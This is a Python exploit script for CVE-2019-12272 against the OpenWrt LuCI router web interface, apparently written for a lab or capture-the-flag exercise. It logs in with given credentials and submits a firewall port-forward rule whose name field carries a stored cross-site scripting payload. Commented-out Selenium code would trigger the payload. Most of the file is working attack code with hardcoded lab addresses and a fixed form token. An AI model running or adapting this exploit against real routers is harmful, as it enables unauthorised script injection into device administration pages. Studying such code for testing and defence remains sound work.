import requests
# from selenium import webdriver
# from selenium.webdriver.common.alert import Alert
import argparse

def exploit(args):

        address = args.address
        username = args.username
        password = args.password
        # 获取 cookie
        session = requests.Session()
        url = 'http://%s/cgi-bin/luci/' % address
        data = {'luci_username':username,'luci_password':password}
        response = session.post(url=url,data=data,verify=False)
        auth = response.request.headers['Cookie'].split('=')
        cookies = {auth[0]:auth[1]}
        # xss注入
        burp0_url = "http://%s/cgi-bin/luci/admin/network/firewall/forwards"  % address
        burp0_cookies = cookies
        burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://192.168.66.129", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryNQOIRGeyxBkDR6TH", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://192.168.66.129/cgi-bin/luci/admin/network/firewall/forwards", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        burp0_data = "------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\ne54016aa6b84dd8de573872ca1ee1ecc\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"cbi.submit\"\r\n\r\n1\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"cbi.sts.firewall.redirect\"\r\n\r\n\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"_newfwd.name\"\r\n\r\n<svg onload=showMessage()//\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"_newfwd.proto\"\r\n\r\ntcp udp\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"_newfwd.extzone\"\r\n\r\nwan\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"_newfwd.extport\"\r\n\r\n123\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"_newfwd.intzone\"\r\n\r\nlan\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"_newfwd.intaddr\"\r\n\r\n192.168.66.1\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"_newfwd.intport\"\r\n\r\n123\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH\r\nContent-Disposition: form-data; name=\"cbi.cts.firewall.redirect.\"\r\n\r\nAdd\r\n------WebKitFormBoundaryNQOIRGeyxBkDR6TH--\r\n"
        response=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        ## 触发 xss，模拟点击 edit 键，以获取 flag
        # driver = webdriver.Chrome()
        # # 发送GET请求
        # url="http://%s/cgi-bin/luci/admin/network/firewall/forwards/cfg103837" % address
        # driver.get(url)

        # # 获取触发的alert
        # alert = Alert(driver)
        # alert_text = alert.text
        # print(alert_text)

        # driver.quit()
def main():
    parser = argparse.ArgumentParser(description='cve-2019-12272.py')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-a', '--address', help='Luci host address', required=True)
    requiredNamed.add_argument('-u', '--username', help='Luci username', required=True)
    requiredNamed.add_argument('-p', '--password', help='Luci password', required=True)
    args = parser.parse_args()
    exploit(args)
if __name__== "__main__":
    # main()


    import requests
    session = requests.Session()
    burp0_url = "http://192.168.66.131:80/luci-static/resources/showM.js"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36", "Accept": "*/*", "Referer": "http://192.168.66.131/cgi-bin/luci/admin/network/firewall/forwards/cfg0f3837", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "If-None-Match": "\"29e-b1-64be386a\"", "If-Modified-Since": "Mon, 24 Jul 2023 08:38:02 GMT", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers)
    response =  requests.get(burp0_url, headers=burp0_headers,allow_redirects=False)
    print(response.text)